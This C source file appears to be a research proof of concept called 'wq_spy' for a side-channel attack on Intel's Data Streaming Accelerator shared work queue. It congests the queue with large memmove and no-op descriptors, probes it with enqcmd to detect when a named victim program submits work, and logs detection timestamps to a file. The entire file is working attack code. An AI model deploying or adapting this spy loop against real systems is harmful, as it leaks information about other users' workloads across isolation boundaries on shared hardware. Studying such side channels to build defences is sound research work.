#include "dsa.h"
#include <signal.h>

#define ATTACK_INTERVAL_NS 10050000 // 39000000
#define TRACE_BUFFER_SIZE 2000
#define XFER_SIZE (1L << 27) // (1L << 29)
#define WQ_SIZE 7
const int TIMESTAMP_ENABLED = 1;

struct timespec ts;
struct wq_info wq_info;
struct dsa_hw_desc noop = {}, mass[WQ_SIZE] = {}, noops[WQ_SIZE] = {};
struct dsa_completion_record comp __attribute__((aligned(32))) = {}, \
    mass_comp[WQ_SIZE] __attribute__((aligned(32))) = {}, \
    noops_comp[WQ_SIZE] __attribute__((aligned(32))) = {};
uint64_t detection_threshold;
uint8_t *src, *dst;
int keep_running = 1;

// traces
int trace_buffer[TRACE_BUFFER_SIZE];
double trace_timestamps[TRACE_BUFFER_SIZE];
int trace_index = 0, ts_index = 0;

void handler(int dummy) {
    keep_running = 0;
    printf("[wq_spy] Stopping...\n");
}

static inline void congest() {
    mass_comp[0].status = 0;
    while (enqcmd(wq_info.wq_portal, &mass[0]));
    for(int i = 1; i < WQ_SIZE - 1; i++) {
        noops_comp[i].status = 0;
        if (enqcmd(wq_info.wq_portal, &noops[i]))
            printf("failed to enqueue noop %d\n", i);
    }
}

static inline int probe_swq() {
    return enqcmd(wq_info.wq_portal, &noop);
}

// Save traces to file
void save_traces(char* taskname) {
    char filename[256];
    snprintf(filename, sizeof(filename), "swq-%s-%s.txt", taskname, 
             TIMESTAMP_ENABLED ? "ts" : "traces");

    FILE* fp = fopen(filename, "w");
    if (!fp) {
        fprintf(stderr, "[wq_spy] Failed to open file\n");
        return;
    }
    
    if (TIMESTAMP_ENABLED) {
        for (int i = 0; i < ts_index; i++)
            fprintf(fp, "%lf\n", trace_timestamps[i]);
    } else {
        for (int i = 0; i < trace_index; i++)
            fprintf(fp, "%u\n", trace_buffer[i]);
    }
    
    fclose(fp);
    printf("[wq_spy] Saved to %s\n", filename);
}

int main(int argc, char *argv[]) {
    char *taskname;
    if (argc == 2) {
        taskname = argv[1];
        signal(SIGINT, handler);
    } else {
        printf("Usage: %s [prog-to-spy]\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    // Initialize work queue
    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq0.0");
    if (rc) {
        fprintf(stderr, "[wq_spy] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }
    
    src = malloc(XFER_SIZE * sizeof(uint8_t));
    dst = malloc(XFER_SIZE * sizeof(uint8_t));
    memset(src, 0, XFER_SIZE * sizeof(uint8_t)); // no page fault
    memset(dst, 0, XFER_SIZE * sizeof(uint8_t));

    noop.opcode = DSA_OPCODE_NOOP;
    noop.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    noop.completion_addr = (uintptr_t) &comp;
    for (int i = 0; i < WQ_SIZE; i++) {
        mass[i].opcode = DSA_OPCODE_MEMMOVE;
        mass[i].flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR | IDXD_OP_FLAG_CC;
        mass[i].src_addr = (uintptr_t) src;
        mass[i].dst_addr = (uintptr_t) dst;
        mass[i].xfer_size = XFER_SIZE;
        mass_comp[i].status = 0;
        mass[i].completion_addr = (uintptr_t) &mass_comp[i];

        noops[i].opcode = DSA_OPCODE_NOOP;
        noops[i].flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
        noops[i].completion_addr = (uintptr_t) &noops_comp[i];
    }
    
    printf("[wq_spy] Spying on task: %s\n", taskname);

    // congest();
    // if (probe_swq()) printf("victim cannot submit\n"); // pretend someone submitted a job
    // nsleep(ATTACK_INTERVAL_NS);
    // printf("swq: %s\n", probe_swq() ? "busy" : "idle");

    int tmp = 0;
    while (trace_index < TRACE_BUFFER_SIZE && keep_running) {
        congest();
        nsleep(ATTACK_INTERVAL_NS);
        // if (probe_swq()) printf("[wq_spy] detected\n");
        if (TIMESTAMP_ENABLED) tmp = probe_swq();
        else trace_buffer[trace_index++] = probe_swq();

        if (TIMESTAMP_ENABLED && tmp) {
            clock_gettime(CLOCK_MONOTONIC, &ts);
            trace_timestamps[ts_index++] = ts.tv_sec + ts.tv_nsec / 1e9;
            printf("detected: %d\n", ts_index - 1);
        } else {
            usleep(10);
        }
    }
    
    save_traces(taskname);

    return EXIT_SUCCESS;
}
